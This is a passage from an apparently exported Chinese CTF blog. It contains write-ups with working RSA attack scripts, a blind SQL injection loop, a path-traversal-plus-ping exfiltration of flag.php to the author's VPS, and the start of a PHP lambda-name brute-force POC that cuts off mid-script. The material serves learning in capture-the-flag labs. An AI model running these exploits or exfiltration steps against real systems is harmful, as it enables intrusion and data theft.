1)from(-\"+str(x)+\")))from(-1)))=\"+str(ord(y))+\")-'\" email = str(int(random.randint(1,99999)))+'@xjb.com' # print email reg(email,payload) a = login(email) if a==1: flag += y print flag break cryptoRSA常规的RSA解密12345678910enc=\"ICCHhzayltixzeuA++PPbDwlialEjQuDBx38ecgQwl5lOTnemrcWYbDeQkIIE5oPQOcSmNX8nmcDgyl4O05jYD7VmDcgwQTIgHeOLovcqGVPHEW4hHSmIR3BB/CBjb3/5+HfeifXF1w+/o148o76D9NtTBYaLk8CTjOscT23PBI8w+WPhHBIPaSbJlDuaHA4Ie6ojsE6mM7cp79dz7bCdAf5a2tUGA6AbNCuP1WVnsBI+IIHX8EDELmBnQ5c13JuYnjHL5lmqL3QK88QwQQ4h/3vUODAWBuzn8meWBgfpqxmHTGJ+du2mRoUTpUBzZy2OxrKdD8J11Hc+yJJJkQe5QgqACbM00K0rTv7kIyB2aB/gUGLNP4IOwV09avUpzLS2PPLgeAVP/JSGYlXZTthy4FlqL5pMN4/+swNnEN6Z+lPzLNe0JB0uNN/yPJ3C3lsSuoFLh0InYI46Tycs8vz1nHQWjQdE6hpD/HpyCbjoC2BE4ugCJKUtmp7mbyDxkjkn5ZkHhrJXK/DF4NQgYmfkZxyLOWsI2UC1niq5qGD3SIspW8NcupyGakYVzD1R9PP8xoxpkjX62f7myXLMmacbJgYe7ExeWdYXMZd76Tnqu9IJJwEO43LZz+w2rqH8DIlhr64JenxaDcIixqFzKmkk6WK71VVT3t788ZxaNhG2yo=\"c=int(enc.decode('base64').encode('hex'),16)n = 365848589691553391654453815696801609393691558975114732077589431735072735814004481321693204054611153742844719038444697593327493027785795731389621927670788503335861977736740530534583572225955976966446771693720421426616666151538067479984725761741317847115913974275314572559550814811157603376899910638368755166255776849626761808720772583206050387900451906315871548607212450421821284358760939660687558588799753487824506759639032283177034815892289194765173975342074810666614953387403646634191147782168926568900983361174986224868620163303631776464544385042160475855173792780028858673004579549168611488908206940265042017827224145445864849990033230038346962998044409425059655414595541354712964867076540952852074402602485254837693009606256646491881886402251519107628767780560029195077356603998621239496833842620813594476086809217145741837067697701029006079475655230057641122885601163764359304119539318186498359110652713132230601632984636292710845264886583673643096710521658506038045125724977714211793704349604343253187208130136333839351343850952892593409667791896415744436543839302830842902421646274217466522255794836216649020356914498443158290307092169834254304137975684324590877396301465368942446331758175055737212871262544202124864201404357e = 65537d = 171667543985758425014232627985840717336387122108163758500542139626729279212540485673813409388397427405892256280730752710530037468765259171638824687119216443453078833931370749271396524300663719786871097595637432285751800013612137436020725492852419342272435212733486026753609513054804440530485467017884797272879406284689903095072725307517165288748564887361729738358011463377509622604034612759898436024272853796444439505507110804160400608180412245257162062494766079887998276493727771202445125297118556385657613871902180087388189988280105656191733965985878495407148701887047735812018200868151321246119065258205755102189932618492331181731032930671506379119003614308043854723142913145153824556828017544028126772950732350030371733003652817854070184981540813302478821473998511699291112000260313162924676245915026226201977284465842505256191235822318812659628683043195357384607192367037650400361829016395922074065034014120534209020328864830006606839179592932609256661738193663329776230050481312159600570791315455079679469956882283489829258240404557309270261381865785081719442470884775430068193960751589033994677379472095235901602941733635505402949964622214247924792042997962235246007680923289071880896909708764598890244005005286926994431628289m =hex(pow(c,d,n))[2:].rstrip('L')print ('0'+m).decode('hex') flag{w3lC0M3_t0_rS4_w0RlD}","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"},{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"RSA-STUDY","slug":"RSA-STUDY","date":"2018-07-23T09:12:58.000Z","updated":"2018-11-02T05:50:52.425Z","comments":true,"path":"2018/07/23/RSA-STUDY/","link":"","permalink":"http://altman.vip/2018/07/23/RSA-STUDY/","excerpt":"RSA原理知识准备素数：素数又称质数，指在一个大于1的自然数中，除了1和此整数自身外，不能被其他自然数整除的数。 互质数：公因数只有1的两个数，叫做互质数 模运算：两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b (mod m)；读作：a同余于b模m，或者，a与b关于模m同余。例如：26 ≡ 14 (mod 12)。 欧拉函数：在数论，对正整数n，欧拉函数是小于n的正整数中与n互质的数的数目（φ(1)=1）。 模反元素：如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。这时，b就叫做a的“模反元素”。","text":"RSA原理知识准备素数：素数又称质数，指在一个大于1的自然数中，除了1和此整数自身外，不能被其他自然数整除的数。 互质数：公因数只有1的两个数，叫做互质数 模运算：两个整数a，b，若它们除以正整数m所得的余数相等，则称a，b对于模m同余，记作: a ≡ b (mod m)；读作：a同余于b模m，或者，a与b关于模m同余。例如：26 ≡ 14 (mod 12)。 欧拉函数：在数论，对正整数n，欧拉函数是小于n的正整数中与n互质的数的数目（φ(1)=1）。 模反元素：如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。这时，b就叫做a的“模反元素”。 公钥与私钥1.找到两个的不同大素数p&amp;q,N=pq。2.根据欧拉函数得到 r=(p-1)(q-1)3.选择一个小于r的整数e，求e关于模r的模反元素d。4.销毁p，q。 这样就得到了公钥(N,e),私钥(N,d) 加密解密过程加密只需要公钥(N,e)，对于明文x进行如下运算x^e ≡ c (mod N)得到密文c。 解密只需要知道私钥(N,d),对于密文c进行如下运算c^d ≡ x （mod N）还原明文x。 CTF中的RSA例题0x01 基础RSA加密用公钥和密文解密出明文，这建立在N可分解的基础上，我们可以通过pq得到秘钥。1234567891011121314151617# coding: utf-8from Crypto.PublicKey import RSAimport gmpy2import codecspub=RSA.importKey(open(\"/Users/a1tm4nz/Downloads/RSA/public.pem\").read())n=pub.n #ne=pub.e #ep=258631601377848992211685134376492365269 # 通过http://factordb.com/分解Nq=286924040788547268861394901519826758027#d=gmpy2.invert(e,(p-1)*(q-1))d=23071769375111040425287244625328797615295772814180109366784249976498215494337c=int(codecs.encode(open('/Users/a1tm4nz/Downloads/RSA/flag.enc','rb').read(),'hex_codec'),16)m=hex(pow(c,d,n))[2:].replace(\"L\",\"\")if(len(m)%2==1):#16进制解密要求密文不能为奇数，在头部填0即可 m='0'+mprint m.decode('hex') 0x02 wiener attack当N或e都很大时，我们可以使用wiener攻击github上有利用脚本: https://github.com/pablocelayes/rsa-wiener-attack 南邮平台上的一道题1234567891011#coding:utf-8from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5import base64flag=raw_input('flag:')key=RSA.construct((1063045321283844468344531168992778520651192162100948533991539097447031440090068191835838938460807260866872379834796862916118785271062209281267667069640000501698142693389209275376843382863579650119977059768375028586326490055087394631528241983631462471709913758728591459476799115050977493979613545056736162868049L, 837165022918376318972691589160491375229372195625940137121740685432530132860541010174727630660292946071507342455170833392895060048564125597915757582027572284342507277083636059558106672685400173531425920294781499112027917632497954958437660357575400222692979844873372105801998210845285775146263117399191185379347L))cipher = Cipher_pkcs1_v1_5.new(key)cipher_text = base64.b64encode(cipher.encrypt(flag))print cipher_text#cipher_text = 'AGgt1h6dudnkeoCr7SFclkYYsYa65KZ8V29bbgbf+BDyjnyx5stCYjcyktat73aHs2EOaMgwGUwj3HwPTvT+T5LHIxM4uTnAgWOui4dnb7vF7QizN0ShY2O1h26CgLnf5I0vQWbY7WCC7kA/orNW7F5yxZiKRAawacS2M5ghP4/Q' N，e都很大。我们用wiener attack 得到d1python rsa-wiener-attack/RSAwienerHacker.py n e 得到私钥d1d=57899763801722261062891290503559835904571946557258761154422546104824094670843 接下来就是常规的RSA解密12345678910111213import base64n=1063045321283844468344531168992778520651192162100948533991539097447031440090068191835838938460807260866872379834796862916118785271062209281267667069640000501698142693389209275376843382863579650119977059768375028586326490055087394631528241983631462471709913758728591459476799115050977493979613545056736162868049e=837165022918376318972691589160491375229372195625940137121740685432530132860541010174727630660292946071507342455170833392895060048564125597915757582027572284342507277083636059558106672685400173531425920294781499112027917632497954958437660357575400222692979844873372105801998210845285775146263117399191185379347d=57899763801722261062891290503559835904571946557258761154422546104824094670843m='AGgt1h6dudnkeoCr7SFclkYYsYa65KZ8V29bbgbf+BDyjnyx5stCYjcyktat73aHs2EOaMgwGUwj3HwPTvT+T5LHIxM4uTnAgWOui4dnb7vF7QizN0ShY2O1h26CgLnf5I0vQWbY7WCC7kA/orNW7F5yxZiKRAawacS2M5ghP4/Q'c=int(base64.b64decode(m).encode('hex'),16)flag=hex(pow(c,d,n))[2:].replace(\"L\",\"\")if(len(flag)%2==1): flag='0'+flagprint flag.decode('hex') 0x03 有公因数的两个N给了两对公钥，N太大无法分解，但是N1,N2有公因数。那么此时公因数就是p，可以分别求出q1，q2题目123456n1=18263905851567773440446838695766097054252159817375942220432646590577605535001102705343902666589196712209131000424743250389209817386462242094905266578654348699073317748484503797678183012090375022172700739930717847219593096973008967105897376613550069563133191469825170677181620033104899474861544205137427444083416158205978241738189319430709815369614381957092634679663073529915011800029514945250518582469896694087993939399022631417819581576165949892810231692555896017395242464371112868608767990194529216988324463096379599680586615395063392235579858007086701467453321499203151052012397135583838714605379937464734426058203n2=16950818485762084795193828768953323876388698051219062552262211712110062204954209462306530235388240321343855913666709750794055992220667151032536667937762799073479211925880106492191394846770654371623007051501782616639485222511300384032213459590408774089539345780246233268007572472533774114330568959631749390932599046733958624832563792588926026242133422467392689761450865841250657088270966077177543599222351800102728976845282712937106806976091210265560260177661816495238213887970556095475226646345568545415814035277834069152282458515989066082948101449829801979628039212597995349260855092279108102204886522855975419755219c1=16274856857661787783089247952446020386301296490309822420733326939579521159181274564159881569720941773424141684911497028248685883897404191432880449283023146073930043226457053587418510143359803678057561120305169670182063356905346792409675959838228170818653485027257264058185367161472527834396804757004371950225319647551718070122431050642186905590213972232201966833949845104276760241004644118590467546314025479853604227295841523010158969804175921406672115195772809154058842429049437301440993794765038365224477229612151404063782303298937771968709567577283974551173044172598459482531433545960749147311254443274915272200560c2=9946468920119252596998213656931348575944985856629754429330209121534145245119561878513995066589817036899299533093751237144960328759208855732474853794711347203865156360078772132790431594811682581926722057546683437873159107885652842304739962490836998123152090675606004046425633751397173768982047965656687448847259753864171018963561303276197312504508548802813909914926514763930195218396740593919987596462341469781868335025782329081775818968846955110510048099746584203570892950955431181639182647914240604278151551608856971433512600491550082244566145491335738112881861092354219766862656988674738232228115996349755982641605e1=1804229351e2=17249876309 解密脚本1234567891011121314151617181920212223242526272829303132# coding: utf-8from Crypto.PublicKey import RSAimport gmpy2import codecsn1=18263905851567773440446838695766097054252159817375942220432646590577605535001102705343902666589196712209131000424743250389209817386462242094905266578654348699073317748484503797678183012090375022172700739930717847219593096973008967105897376613550069563133191469825170677181620033104899474861544205137427444083416158205978241738189319430709815369614381957092634679663073529915011800029514945250518582469896694087993939399022631417819581576165949892810231692555896017395242464371112868608767990194529216988324463096379599680586615395063392235579858007086701467453321499203151052012397135583838714605379937464734426058203n2=16950818485762084795193828768953323876388698051219062552262211712110062204954209462306530235388240321343855913666709750794055992220667151032536667937762799073479211925880106492191394846770654371623007051501782616639485222511300384032213459590408774089539345780246233268007572472533774114330568959631749390932599046733958624832563792588926026242133422467392689761450865841250657088270966077177543599222351800102728976845282712937106806976091210265560260177661816495238213887970556095475226646345568545415814035277834069152282458515989066082948101449829801979628039212597995349260855092279108102204886522855975419755219c1=16274856857661787783089247952446020386301296490309822420733326939579521159181274564159881569720941773424141684911497028248685883897404191432880449283023146073930043226457053587418510143359803678057561120305169670182063356905346792409675959838228170818653485027257264058185367161472527834396804757004371950225319647551718070122431050642186905590213972232201966833949845104276760241004644118590467546314025479853604227295841523010158969804175921406672115195772809154058842429049437301440993794765038365224477229612151404063782303298937771968709567577283974551173044172598459482531433545960749147311254443274915272200560c2=9946468920119252596998213656931348575944985856629754429330209121534145245119561878513995066589817036899299533093751237144960328759208855732474853794711347203865156360078772132790431594811682581926722057546683437873159107885652842304739962490836998123152090675606004046425633751397173768982047965656687448847259753864171018963561303276197312504508548802813909914926514763930195218396740593919987596462341469781868335025782329081775818968846955110510048099746584203570892950955431181639182647914240604278151551608856971433512600491550082244566145491335738112881861092354219766862656988674738232228115996349755982641605e1=1804229351e2=17249876309q=gmpy2.gcd(n1,n2)p1=n1//qp2=n2//qd1=gmpy2.invert(e1,(p1-1)*(q-1))d2=gmpy2.invert(e2,(p2-1)*(q-1))while d1&lt;0: d1+=(p1-1)*(q-1)while d2&lt;0: d2+=(p2-1)*(q-1)m2=hex(pow(c2,d2,n2))[2:].replace(\"L\",\"\")m1=hex(pow(c1,d1,n1))[2:].replace(\"L\",\"\")if(len(m2)%2==1): m2='0'+m2if(len(m1)%2==1): m1 ='0'+ m1print m1.decode('hex')print m2.decode('hex') 0x04 低指数攻击e=3时进行低指数攻击12345678910111213141516171819# coding:utf-8import gmpy2c=545666236924510340010249577709750283325731706774285241719627277546281629429734726717293022303311450772262647904537263500252284243393598944613964442974546950954108203106726282255676706429218187217515454665602130999856741523362906632677988245886500953095201122016935004088287862399317170828388632964668574391252399791901016522260191839164586088073933168096433230663402492577707149742261018318811473591856287943664733276898405984282679026758294364432874973387827086342720762945025346962005339728347282927842299962927871005260338747371451546554777112213044710533502191671159066680035742327279159127279685106716107705888068319962657817786581813767331740609788885735155741039564703781141646102609725965697004923161084032164730408824475517786576979990372940555488021025837456038491436690372760376483602299268887032528766383572923258228355911069631275397149328319966792315903921085816103476508992023873616148326626245855060470294978538631677232260545724075728912626994884533001056079733734460116442499311813113038763837974777469202302071221647473459505245546281400799833123812072606012604323510933244028733287443734697557314202167934768160824072400916728008549350662843995750077421616789178835625661267955774815287104291379928002318796086248n=721059527572145959497866070657244746540818298735241721382435892767279354577831824618770455583435147844630635953460258329387406192598509097375098935299515255208445013180388186216473913754107215551156731413550416051385656895153798495423962750773689964815342291306243827028882267935999927349370340823239030087548468521168519725061290069094595524921012137038227208900579645041589141405674545883465785472925889948455146449614776287566375730215127615312001651111977914327170496695481547965108836595145998046638495232893568434202438172004892803105333017726958632541897741726563336871452837359564555756166187509015523771005760534037559648199915268764998183410394036820824721644946933656264441126738697663216138624571035323231711566263476403936148535644088575960271071967700560360448191493328793704136810376879662623765917690163480410089565377528947433177653458111431603202302962218312038109342064899388130688144810901340648989107010954279327738671710906115976561154622625847780945535284376248111949506936128229494332806622251145622565895781480383025403043645862516504771643210000415216199272423542871886181906457361118669629044165861299560814450960273479900717138570739601887771447529543568822851100841225147694940195217298482866496536787241e=3i = 0while True: if gmpy2.iroot(c + i * n, 3)[1] == True: print \"Success!\" m=gmpy2.iroot(c + i * n, 3) print m break i += 1# m=440721643740967258786371951429849843897639673893942371730874939742481383302887786063966117819631425015196093856646526738786745933078032806737504580146717737115929461581126895844008044713461807791172016433647699394456368658396746134702627548155069403689581548233891848149612485605022294307233116137509171389596747894529765156771462793389236431942344003532140158865426896855377113878133478689191912682550117563858186Lm=hex(m)[2:].replace(\"L\",\"\")if (len(m) % 2 == 1): m= '0' + mprint m.decode('hex') 0x05 共模攻击当123456789101112131415161718192021# coding:utf8import gmpy2import libnumimport codecsn=0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929c1=int(codecs.encode(open(\"/Users/a1tm4nz/crypto/veryhardRSA/flag.enc1\",'rb').read(),'hex_codec'),16)c2=int(codecs.encode(open(\"/Users/a1tm4nz/crypto/veryhardRSA/flag.enc2\",'rb').read(),'hex_codec'),16)e1=17e2=65537s1=libnum.xgcd(e1,e2)[0]s2=libnum.xgcd(e1,e2)[1]#此处判断s1和s2是否小于0，因为pow()函数里s1和s2不能为负，if(s1&lt;0): s1=-s1 c1=gmpy2.invert(c1,n)#若s1为负,s1取正，c1取逆if(s2&lt;0): s2=-s2 c2=gmpy2.invert(c2,n)m=libnum.n2s((pow(c1,s1,n)*pow(c2,s2,n)%n))print(m) 0x06 Lattice based attacks on RSA题目12345# n=0x79982a272b9f50b2c2bc8b862ccc617bb39720a6dc1a22dc909bbfd1243cc0a03dd406ec0b1a78fa75ce5234e8c57e0aab492050906364353b06ccd45f90b7818b04be4734eeb8e859ef92a306be105d32108a3165f96664ac1e00bba770f04627da05c3d7513f5882b2807746090cebbf74cd50c0128559a2cc9fa7d88f7b2d# e=0x3# c=0x381db081852c92d268b49a1b9486d724e4ecf49fc97dc5f20d1fad902b5cdfb49c8cc1e968e36f65ae9af7e8186f15ccdca798786669a3d2c9fe8767a7ae938a4f9115ae8fed4928d95ad550fddd3a9c1497785c9e2279edf43f04601980aa28b3b52afb55e2b34e5b175af25d5b3bd71db88b3b31e48a177a469116d957592c# b=0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000# m=b+x (x:64bit) n无法分解，低指数爆破失败，但我们已用明文的高位。参考:https://github.com/mimoo/RSA-and-LLL-attacks使用sage可以解出明文12345678910111213141516171819202122232425262728# partial_m.sagen = 0x79982a272b9f50b2c2bc8b862ccc617bb39720a6dc1a22dc909bbfd1243cc0a03dd406ec0b1a78fa75ce5234e8c57e0aab492050906364353b06ccd45f90b7818b04be4734eeb8e859ef92a306be105d32108a3165f96664ac1e00bba770f04627da05c3d7513f5882b2807746090cebbf74cd50c0128559a2cc9fa7d88f7b2de = 3m = randrange(n)c = pow(m, e, n)beta = 1epsilon = beta^2/7nbits = n.nbits()kbits = floor(nbits*(beta^2/e-epsilon))#mbar = m &amp; (2^nbits-2^kbits)mbar = 0xfedcba98765432100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c = 0x381db081852c92d268b49a1b9486d724e4ecf49fc97dc5f20d1fad902b5cdfb49c8cc1e968e36f65ae9af7e8186f15ccdca798786669a3d2c9fe8767a7ae938a4f9115ae8fed4928d95ad550fddd3a9c1497785c9e2279edf43f04601980aa28b3b52afb55e2b34e5b175af25d5b3bd71db88b3b31e48a177a469116d957592cprint \"upper %d bits (of %d bits) is given\" % (nbits-kbits, nbits)PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (mbar + x)^e - cprint mx0 = f.small_roots(X=2^kbits, beta=1)[0] # find root &lt; 2^kbits with factor = nprint mbar + x0print x0 // 在线sage网站 http://sagecell.sagemath.org/ 0x07 广播攻击使用不同的模数n，相同的公钥指数e加密相同的信息。就会得到多个(m^e) ==ci (mod ni)，将(m^e)视为一个整体M，这就是典型的中国剩余定理适用情况。按照本文的中国剩余定理小节容易求得m^e的值，当e较小时直接开e方即可，可使用gmpy2.iroot(M,e)。例题和脚本1234567891011121314151617181920212223242526272829303132import gmpy2def broadcast(n1, n2 ,n3, c1, c2, c3): n = [n1, n2, n3] C = [c1, c2, c3] N = 1 for i in n: N *= i Ni = [] for i in n: Ni.append(N / i) T = [] for i in xrange(3): T.append(long(gmpy2.invert(Ni[i], n[i]))) X = 0 for i in xrange(3): X += C[i] * Ni[i] * T[i] m3 = X % N m = gmpy2.iroot(m3, 3) return mn1=0x43d819a4caf16806e1c540fd7c0e51a96a6dfdbe68735a5fd99a468825e5ee55c4087106f7d1f91e10d50df1f2082f0f32bb82f398134b0b8758353bdabc5ba2817f4e6e0786e176686b2e75a7c47d073f346d6adb2684a9d28b658dddc75b3c5d10a22a3e85c6c12549d0ce7577e79a068405d3904f3f6b9cc408c4cd8595bf67fe672474e0b94dc99072caaa4f866fc6c3feddc74f10d6a0fb31864f52adef71649684f1a72c910ec5ca7909cc10aef85d43a57ec91f096a2d4794299e967fcd5add6e9cfb5baf7751387e24b93dbc1f37315ce573dc063ecddd4ae6fb9127307cfc80a037e7ff5c40a5f7590c8b2f5bd06dd392fbc51e5d059cffbcb85555c1=0x5517bdd6996b54aa72c2a9f1eec2d364fc71880ed1fa8630703a3c38035060b675a144e78ccb1b88fa49bad2ed0c6d5ad0024d4bb18e7d87f3509b0dbf238a0d1ff33f48ffc99c1bdf2f2547a193e7ab66eec562a7bc3f9521f70d453ff6d1fdb24de40b3f621ca6be6606440d09d0f302d5806e7cebc9b612522f181baa43373d6827ffd794916ffcc205147c8d88a59d2fce4bbcdfd6a4934fb72d5f74be79a1bd64b4305865c9d20eb96d8bd7976440a4bc326fdb5b9a04bac3762a664346a175f1029f448bb421506f3dfeb75d6531f89f0b92a7e66e295ede5928ec8301a202d5c9fd528cda84190c2b47f423af1a59c63ae6253d1903c83ae158f9b42n2=0x60d175fdb0a96eca160fb0cbf8bad1a14dd680d353a7b3bc77e620437da70fd9153f7609efde652b825c4ae7f25decf14a3c8240ea8c5892003f1430cc88b0ded9dae12ebffc6b23632ac530ac4ae23fbffb7cfe431ff3d802f5a54ab76257a86aeec1cf47d482fec970fc27c5b376fbf2cf993270bba9b78174395de3346d4e221d1eafdb8eecc8edb953d1ccaa5fc250aed83b3a458f9e9d947c4b01a6e72ce4fee37e77faaf5597d780ad5f0a7623edb08ce76264f72c3ff17afc932f5812b10692bcc941a18b6f3904ca31d038baf3fc1968d1cc0588a656d0c53cd5c89cedba8a5230956af2170554d27f524c2027adce84fd4d0e018dc88ca4d5d26867c2=0x3288e3ea8c74fd004e14b66a55acdcbcb2e9bd834b0f543514e06198045632b664dac3cf8578cde236a16bef4a1246de692ec6a61ce507a220fa04e09044632787ba42b856cb13be6e905c20b493004822888d3c44c6fc367c7af0287f1683f08baae5bb650902067908e93246af3954d62437aa14248529fd07c8902b9403920b6550f12d1c398881cd7fc8b5f096f38c33df21887bfe989fb011a9deade2370d90347510b76f1f3e3dedf09c148675ea8919878c8ac188253b78886d906cd1f3aee5484d6d13fb4bbad233f670f825fa618adbf0705ed4e31b60957f5c28cfd1febd13370630a6c94990e341d38918a9c1faa614fd14cdd41b7bc8461f2f0cn3=0x280f992dd63fcabdcb739f52c5ed1887e720cbfe73153adf5405819396b28cb54423d196600cce76c8554cd963281fc4b153e3b257e96d091e5d99567dd1fa9ace52511ace4da407f5269e71b1b13822316d751e788dc935d63916075530d7fb89cbec9b02c01aef19c39b4ecaa1f7fe2faf990aa938eb89730eda30558e669da5459ed96f1463a983443187359c07fba8e97024452087b410c9ac1e39ed1c74f380fd29ebdd28618d60c36e6973fc87c066cae05e9e270b5ac25ea5ca0bac5948de0263d8cc89d91c4b574202e71811d0ddf1ed23c1bc35f3a042aac6a0bdf32d37dede3536f70c257aafb4cfbe3370cd7b4187c023c35671de3888a1ed1303c3=0xb0c5ee1ac47c671c918726287e70239147a0357a9638851244785d552f307ed6a049398d3e6f8ed373b3696cfbd0bce1ba88d152f48d4cea82cd5dafd50b9843e3fa2155ec7dd4c996edde630987806202e45821ad6622935393cd996968fc5e251aa3539ed593fe893b15d21ecbe6893eba7fe77b9be935ca0aeaf2ec53df7c7086349eb12792aefb7d34c31c18f3cd7fb68e8a432652ef76096096e1a5d7ace90a282facf2d2760e6b5d98f0c70b23a6db654d10085be9dcc670625646a153b52c6c710efe8eb876289870bdd69cb7b45813e4fcfce815d191838926e9d60dd58be73565cff0e10f4e80122e077a5ee720caedc1617bf6a0bb072bbd2dab0m = broadcast(n1,n2,n3,c1,c2,c3)print hex(int(m[0])).replace(\"L\",\"\")","categories":[],"tags":[{"name":"crypto","slug":"crypto","permalink":"http://altman.vip/tags/crypto/"}]},{"title":"DC0531CTF-WP","slug":"DC0531CTF-WP","date":"2018-06-18T08:10:38.000Z","updated":"2018-11-02T05:49:09.711Z","comments":true,"path":"2018/06/18/DC0531CTF-WP/","link":"","permalink":"http://altman.vip/2018/06/18/DC0531CTF-WP/","excerpt":"比赛四道WEB题 都挺有难度。","text":"比赛四道WEB题 都挺有难度。 web1这个题刚开始我以为是关注公众号就会给flag，结果是一道挺有难度的题目。进去公众号发送flag，得到如下内容12345678Welcome to DC0531 unknown battle ground! you have following options to utilize: 1. find a weapon (f:) 2. pick up a weapon (for instance: p:kar98) 3. reload a weapon (r:) 4. shoot a target (s:xxx) 5. check ur weapon's status (c:) 6. upload ur weapon (just upload image-file) 7. show ur weapon (sh:) 随意的尝试后没什么用，得到提示：shoot your own ip在自己的VPS上开了个端口监听，然后发送s:vps，没有回显。经过尝试发现是ICMP协议。1tcpdump -i eth0 icmp 然后继续s:vps，得到一条来自139.198.3.171的请求。139.198.3.171可能就是题目地址。访问139.198.3.171，首页是乱码，简单的尝试后发现了GIT泄露。使用Githack恢复了源码。接下来就是代码审计。 这是一个Thinkphp框架的网站，直接定位到Controller。查看TestController.class.php发现了实现微信公众号功能的两个关键函数12345678910111213141516171819202122232425262728293031public function p($weapon)&#123; $res = \"\"; if(!is_file($this-&gt;real_path . '/' . $weapon))&#123; $res = \"No such weapon! U bitch!\\n\"; &#125;else&#123; $this-&gt;info['weapon'] = $weapon; $this-&gt;info['bullet'] = substr(base64_encode(file_get_contents($this-&gt;real_path . '/' . $this-&gt;info['weapon'])),0,100); // no bullets initially $this-&gt;info['status'] = 0; $res = \"You have changed ur weapon to \" . $weapon . \"\\n\"; &#125; return $res; &#125; public function s($target)&#123; $res = \"\"; if(!preg_match('/^(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)(?:[.](?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d))&#123;3&#125;$/', $target))&#123; $res = \"This is not a target! R U kidding?\\n\"; &#125;else&#123; // make sure u have bullets if($this-&gt;info['status']&gt;0)&#123; $this-&gt;info['status'] = $this-&gt;info['status'] - 1; $bullet = $this-&gt;info['bullet'][100 - $this-&gt;info['status']]; system(\"ping -c 1 -W 1 -p '\" . bin2hex($bullet) .\"' \".$target . \" 2&gt;&amp;1 1&gt;/dev/null\"); $res = \"You hit it once!\\n\"; &#125;else&#123; $res = \"You have run out of bullets\\n\"; &#125; &#125; return $res; &#125; p函数引入文件并且把内容进行base64后取前100位存入BULLET中。s函数会将BULLET一位一位的发送到目标IP。于是构造payload:12p:../../var/www/html/flag.phps:VPS_ip 引入flag.php不断发送s:VPS_ip指令获得flag.php的base64编码。使用tcpdump接受数据1tcpdump -i eth1 icmp and host vps_ip -XXn &gt; flag.txt 然后对flag.txt处理下得到编码D9waHAKJGZsYWcgPSAiREMwNTMxe1dlY2hBdF9Jc19Tb19DMG9sfSI7Cg==解码是乱码。。然后陷入迷茫。突然发先编码只有59位，应该少了一位。自己对 &lt;?php 编码得到 PD9waHA=在首位补上P得到PD9waHAKJGZsYWcgPSAiREMwNTMxe1dlY2hBdF9Jc19Tb19DMG9sfSI7Cg==解码得到flag12&lt;?php$flag = \"DC0531&#123;WechAt_Is_So_C0ol&#125;\";","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]},{"title":"SUCTF-WEB","slug":"SUCTF-WEB","date":"2018-05-30T07:22:13.000Z","updated":"2018-11-02T05:46:22.956Z","comments":true,"path":"2018/05/30/SUCTF-WEB/","link":"","permalink":"http://altman.vip/2018/05/30/SUCTF-WEB/","excerpt":"比赛时没时间做，官方赛后给出了writeup和docker镜像，好评。12345suctf/2018-web-multi_sqlsuctf/2018-web-homeworksuctf/2018-web-hateitsuctf/2018-web-getshellsuctf/2018-web-annonymous","text":"比赛时没时间做，官方赛后给出了writeup和docker镜像，好评。12345suctf/2018-web-multi_sqlsuctf/2018-web-homeworksuctf/2018-web-hateitsuctf/2018-web-getshellsuctf/2018-web-annonymous 环境部署docker还是很方便，一键部署，示例annonymous12docker pull suctf/2018-web-annonymousdocker run -d -p 6666:80 suctf/2018-web-annonymous WEBannonymousphp审计题，源码很短12345678910111213&lt;?php$MY = create_function(\"\",\"die(`cat flag.php`);\");$hash = bin2hex(openssl_random_pseudo_bytes(32));eval(\"function SUCTF_$hash()&#123;\" .\"global \\$MY;\" .\"\\$MY();\" .\"&#125;\");if(isset($_GET['func_name']))&#123; $_GET[\"func_name\"](); die();&#125;show_source(__FILE__); 首先使用了create_function函数创建了一个打印flag的函数并赋值给$MY然后又随机命名了了一个执行$My的函数，那么我们有两个方法去打印flag1.执行SUCTF_$hash()2.执行$MY()方法一中 openssl_random_pseudo_bytes(32)预测显然不可能只能尝试爆破create_function()产生的函数名。本地测试打印$MY，发现函数名为%00lambda_1，且每访问一次+1。如果%00lambda_x不是很大。我们可以不停访问一个很大的值n，让x增长到n即可。如果已经x很大，那么这个办法就不行了，就需要让apache开启新的进程使得x从一开始。用上现成POC123456789101112131415161718192021222324252627# coding: UTF-8# Author: orange@chroot.org# import requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry: requests.packages.urllib3.disable_warnings()except: passdef run(i): while 1: HOST = '127.0.0.1' PORT = 12344 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall('GET / 